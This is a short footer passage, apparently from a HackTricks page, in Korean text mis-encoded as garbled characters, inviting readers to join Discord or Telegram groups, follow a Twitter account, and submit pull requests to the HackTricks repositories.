* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
